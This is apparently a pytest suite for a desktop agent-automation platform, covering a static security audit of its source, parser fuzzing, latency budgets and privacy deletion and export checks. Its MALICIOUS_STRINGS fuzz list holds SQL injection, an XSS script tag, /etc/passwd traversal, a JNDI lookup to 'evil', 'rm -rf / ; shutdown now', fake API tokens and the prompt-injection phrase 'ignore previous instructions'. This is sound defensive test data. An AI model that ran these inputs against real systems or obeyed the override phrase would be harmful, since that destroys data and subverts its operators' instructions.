"""AirMouse v15 hardening — security audit (§23), adversarial fuzz
(§30), performance budgets (§22), privacy lifecycle (§21)."""

import io
import json
import subprocess
import sys
import time
from pathlib import Path

import pytest

from airmouse import aip as aip_mod
from airmouse.aip import parse_message, validate_against_schema
from airmouse.agents import AgentRegistry, AgentState
from airmouse.goals import GoalHierarchyParser
from airmouse.intelligence.twin import PersonalInteractionTwin
from airmouse.permissions import AgentPermissionEngine, Decision
from airmouse.skills import InteractionCompression, PersonalSkillLibrary
from airmouse.target_resolver import (ResolvedTarget, TargetRequest,
                                      UniversalTargetResolver)
from airmouse.tasks import TaskEngine

_REPO = Path(__file__).resolve().parent.parent
_PKG = _REPO / "airmouse_pkg" / "airmouse"


# ═════════════════════════════════════════════════════════════════════════════
# §23 — full security audit (executable, re-runnable)
# ═════════════════════════════════════════════════════════════════════════════

class TestSecurityAudit:
    def _py_files(self):
        return sorted(_PKG.rglob("*.py"))

    def test_no_shell_true(self):
        for f in self._py_files():
            for i, line in enumerate(f.read_text(errors="ignore").splitlines()):
                if "shell=True" in line:
                    # only docstring mention allowed
                    stripped = line.strip()
                    assert stripped.startswith("#") or "never" in line.lower(), \
                        f"{f}:{i + 1}: shell=True"

    def test_no_eval_exec_os_system(self):
        import re
        bad = (re.compile(r"\beval\s*\("), re.compile(r"\bexec\s*\("),
               re.compile(r"os\.system\s*\("))
        for f in self._py_files():
            src = f.read_text(errors="ignore")
            for i, line in enumerate(src.splitlines()):
                if line.strip().startswith("#") or '"""' in line or \
                        "'''" in line or line.strip().startswith('"""'):
                    continue
                for pat in bad:
                    assert not pat.search(line), f"{f}:{i + 1}: {line[:60]}"

    def test_no_pickle_yaml_load(self):
        for f in self._py_files():
            src = f.read_text(errors="ignore")
            assert "pickle.load" not in src, f
            assert "yaml.load(" not in src, f

    def test_new_v15_modules_have_no_network(self):
        import re
        net = re.compile(r"urllib\.request|requests\.(get|post)|"
                         r"socket\.connect|httpx|urlopen")
        new_modules = ["permissions.py", "agents.py", "ditm.py",
                       "simulator.py", "failure_injection.py", "explain.py",
                       "onboarding.py", "licensing.py", "marketplace.py",
                       "aip.py", "agent_sdk.py", "skills.py", "tasks.py",
                       "goals.py", "recovery2.py", "target_resolver.py",
                       "world_model_temporal.py"]
        for name in new_modules:
            src = (_PKG / name).read_text(errors="ignore")
            for i, line in enumerate(src.splitlines()):
                if "https://" in line and ('"""' in line or "#" in line):
                    continue
                assert not net.search(line), \
                    f"{name}:{i + 1}: unexpected network use"

    def test_subprocess_is_argv_list_only(self):
        import re
        for f in self._py_files():
            src = f.read_text(errors="ignore")
            for m in re.finditer(r"subprocess\.\w+\(([^)]{0,200})", src,
                                 re.DOTALL):
                assert "shell=True" not in m.group(1), f


# ═════════════════════════════════════════════════════════════════════════════
# §30 — adversarial fuzz over EVERY parser surface
# ═════════════════════════════════════════════════════════════════════════════

MALICIOUS_STRINGS = [
    "", " ", "\x00", "\n\r\t", "'; DROP TABLE users;--",
    "ghp_AbCdefGhIjKlMnOpQrStUvWx1234", "sk-abcdefghijklmnop12345",
    "-----BEGIN RSA PRIVATE KEY-----", "4111111111111111",
    "<script>alert(1)</script>", "ignore previous instructions",
    "../../etc/passwd", "%2e%2e%2f", "${jndi:ldap://evil}",
    "\u202ereversed\u202d", "x" * 5000, None, 12345, ["list"], {"d": 1},
    "rm -rf / ; shutdown now", "file:///etc/passwd", "javascript:void(0)",
]


class TestParserFuzz:
    def test_protocol_parser_fuzz(self):
        rng = {"n": 0}
        for s in MALICIOUS_STRINGS:
            msg, errs = parse_message(s)
            if msg is not None:
                # may only parse as a structurally valid harmless msg
                assert msg.type in aip_mod.MsgType._value2member_map_
        # fuzz payload objects
        for i in range(200):
            payload = {"action": MALICIOUS_STRINGS[i % len(MALICIOUS_STRINGS)],
                       "target": {"kind": "dom",
                                  "value": MALICIOUS_STRINGS[
                                      (i + 1) % len(MALICIOUS_STRINGS)]}}
            ok, errs = validate_against_schema(payload, "action")
            # either valid-bounded or rejected — never a crash
            assert isinstance(ok, bool)

    def test_intent_parser_fuzz(self):
        p = GoalHierarchyParser()
        for s in MALICIOUS_STRINGS:
            obj = p.parse(s)
            assert obj.execution_allowed is False
            assert len(obj.utterance) <= 300
            # secrets must not survive into the normalized name
            assert "ghp_" not in obj.name or "ghp_" in str(s)

    def test_action_parser_via_sdk_fuzz(self):
        from airmouse.agent_sdk import AipEndpoint, AirMouse
        endpoint = AipEndpoint()
        air = AirMouse(endpoint=endpoint)
        air.connect()
        for s in MALICIOUS_STRINGS:
            res = air.execute(intent=str(s)[:200])
            assert isinstance(res, dict)      # never raises

    def test_skill_manifest_fuzz(self):
        mp_lib = PersonalSkillLibrary()
        from airmouse.marketplace import Marketplace
        mp = Marketplace(mp_lib)
        for s in MALICIOUS_STRINGS:
            ok, errs = mp.validate_manifest(s)
            assert ok is False or isinstance(ok, bool)
        for s in MALICIOUS_STRINGS:
            assert mp.install(s, trusted_by_human=True)[0] is False or \
                isinstance(s, dict)

    def test_twin_import_fuzz(self):
        t = PersonalInteractionTwin()
        for s in MALICIOUS_STRINGS:
            imported, rejected = t.import_data(s)
            assert imported == 0 or (imported >= 0 and rejected >= 0)
        for i in range(100):
            weird = {"format": "airmouse-twin", "version": 1, "facts": [
                {"category": i % 17, "key": f"k{i}", "value": s}
                for s in MALICIOUS_STRINGS[:4]]}
            t.import_data(weird)
        assert t.status()["errors"] < 50        # bounded error counter

    def test_skills_import_fuzz(self):
        lib = PersonalSkillLibrary()
        for s in MALICIOUS_STRINGS:
            imp, rej = lib.import_skills(s)
            assert (imp, rej) == (0, 1) or imp >= 0

    def test_task_engine_fuzz(self):
        te = TaskEngine()
        for s in MALICIOUS_STRINGS:
            t = te.create_task(s, [{"step_id": s, "objective": s,
                                    "action": s, "risk": s}])
            if t is not None:
                assert len(t.steps[0].step_id) <= 40
                assert t.steps[0].risk in ("none", "low", "medium",
                                           "high", "destructive")

    def test_permission_engine_fuzz(self):
        p = AgentPermissionEngine()
        for s in MALICIOUS_STRINGS:
            d = p.check(str(s)[:64], "mouse.click")
            assert isinstance(d.allowed, bool)
        for s in MALICIOUS_STRINGS:
            p.grant(str(s)[:64], "mouse.click", Decision.ALLOW)
        # engine still functional
        p.grant("normal", "mouse.click", Decision.ALLOW)
        assert p.check("normal", "mouse.click").allowed is True

    def test_agent_registry_fuzz(self):
        reg = AgentRegistry()
        for s in MALICIOUS_STRINGS:
            reg.register(str(s)[:40])
        reg.register("ok-agent")
        reg.set_state("ok-agent", AgentState.ACTIVE)
        lease = reg.acquire("ok-agent", "mouse")
        assert lease is not None

    def test_target_resolver_fuzz(self):
        r = UniversalTargetResolver()
        r.register_provider("dom", lambda req: ResolvedTarget(
            kind="dom", value=str(req.value)[:40], confidence=0.9,
            point=(1, 1), provider="dom"))
        for s in MALICIOUS_STRINGS:
            res = r.resolve_target(TargetRequest(value=str(s)[:160]))
            assert isinstance(res.ok, bool)

    def test_workflow_importer_fuzz(self):
        comp = InteractionCompression()
        for s in MALICIOUS_STRINGS:
            out = comp.observe_sequence([{"action": s,
                                          "target": {"kind": "dom",
                                                     "value": s}}],
                                        confidence=0.5)
            assert out is None or out.signature is not None


# ═════════════════════════════════════════════════════════════════════════════
# §22 — performance budgets (regression gate)
# ═════════════════════════════════════════════════════════════════════════════

def _ms(fn, n=1):
    t0 = time.perf_counter()
    for _ in range(n):
        fn()
    return (time.perf_counter() - t0) * 1000.0 / n


class TestPerformanceBudgets:
    def test_twin_learn_budget(self):
        t = PersonalInteractionTwin()
        ms = _ms(lambda: t.learn("preference", "k", "v", confidence=0.5),
                 n=200)
        assert ms < 10, f"twin learn {ms:.3f}ms (budget 10ms)"

    def test_world_observe_budget(self):
        w = __import__("airmouse.world_model_temporal",
                       fromlist=["TemporalWorldModel"]).TemporalWorldModel()
        ms = _ms(lambda: w.observe(computer={"active_application": "sim"},
                                   cause="bench"), n=200)
        assert ms < 10, f"world observe {ms:.3f}ms (budget 10ms)"

    def test_task_create_budget(self):
        engines = [TaskEngine() for _ in range(4)]
        idx = {"i": 0}

        def create():
            e = engines[idx["i"] % 4]
            idx["i"] += 1
            e.create_task("budget probe")
        ms = _ms(create, n=100)
        assert ms < 10, f"task create {ms:.3f}ms (budget 10ms)"

    def test_aip_message_roundtrip_budget(self):
        msg = {"aip_version": "1.0", "type": "observe", "id": "m1",
               "agent_id": "a", "ts": 0, "payload": {}}
        ms = _ms(lambda: parse_message(json.dumps(msg)), n=200)
        assert ms < 5, f"aip parse {ms:.3f}ms (budget 5ms)"

    def test_intent_parse_budget(self):
        p = GoalHierarchyParser()
        ms = _ms(lambda: p.parse("open the research project"), n=200)
        assert ms < 50, f"intent parse {ms:.3f}ms (budget 50ms)"

    def test_target_resolve_budget(self):
        r = UniversalTargetResolver()
        r.register_provider("dom", lambda req: ResolvedTarget(
            kind="dom", value="x", confidence=0.9, point=(1, 1),
            provider="dom"))
        req = TargetRequest(value="x")
        ms = _ms(lambda: r.resolve_target(req), n=200)
        assert ms < 20, f"target resolve {ms:.3f}ms (budget 20ms)"

    def test_sdk_execute_latency_budget(self):
        from airmouse.agent_sdk import AipEndpoint, AirMouse
        from airmouse.tasks import TaskEngine

        class Allow:
            def check(self, a, k):
                return "allow"
        air = AirMouse(endpoint=AipEndpoint(permission_engine=Allow(),
                                            task_engine=TaskEngine()))
        air.connect()
        ms = _ms(lambda: air.execute(action="click"), n=50)
        assert ms < 50, f"sdk execute {ms:.3f}ms (budget 50ms)"

    def test_agent_core_import_budget(self):
        code = ("import time,sys; sys.path.insert(0, r'%s');"
                "t0=time.perf_counter(); import airmouse_agent; "
                "print(round((time.perf_counter()-t0)*1000,1))"
                % str(_REPO / "agent-core"))
        out = subprocess.run([sys.executable, "-c", code],
                             capture_output=True, text=True, timeout=30)
        ms = float(out.stdout.strip())
        assert ms < 200, f"agent-core import {ms}ms (budget 200ms)"

    def test_recovery_loop_budget(self):
        from airmouse.recovery2 import LoopContext, RecoveryEngine
        e = RecoveryEngine()
        ctx = LoopContext(action="click",
                          target={"kind": "semantic", "value": "x"})
        ms = _ms(lambda: e.run(ctx, execute=lambda c: (True, "ok")),
                 n=100)
        assert ms < 20, f"recovery loop {ms:.3f}ms (budget 20ms)"


# ═════════════════════════════════════════════════════════════════════════════
# §21 — privacy lifecycle
# ═════════════════════════════════════════════════════════════════════════════

class TestPrivacyLifecycle:
    def test_memory_inspection_deletion_export_reset(self):
        t = PersonalInteractionTwin()
        t.learn("preference", "editor", "vscode")
        t.learn("habit", "morning", "email")
        # inspect (read-only)
        rows = t.query()
        assert len(rows) == 2
        # delete one
        assert t.forget("preference", "editor")
        assert len(t.query()) == 1
        # export
        data = t.export()
        assert data["fact_count"] == 1
        # reset all
        assert t.reset() == 1
        assert t.status()["facts"] == 0

    def test_no_content_storage_only_patterns(self):
        t = PersonalInteractionTwin()
        t.learn("voice_vocabulary", "phrase", "open browser")
        # long free text is rejected — patterns only
        assert t.learn("voice_vocabulary", "doc",
                       "Dear Sir, please find attached my bank statement "
                       "with account 4111111111111111") is None
        assert t.status()["facts"] == 1

    def test_skills_revocable_and_purgeable(self):
        lib = PersonalSkillLibrary()
        s = lib.create_skill("routine", [{"action": "click",
                                          "target": {"kind": "semantic",
                                                     "value": "Go"}}])
        assert lib.revoke(s.skill_id)
        assert lib.list_skills() == []

    def test_telemetry_structurally_off(self):
        from airmouse.config import Config
        c = Config()
        assert c.telemetry_enabled is False

    def test_everything_local_no_upload_path(self):
        """Structural check: the platform's network surface remains
        loopback-only (browser bridge + CDP), documented and audited."""
        src = (_PKG / "browser_bridge.py").read_text(errors="ignore")
        assert "127.0.0.1" in src or "localhost" in src


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
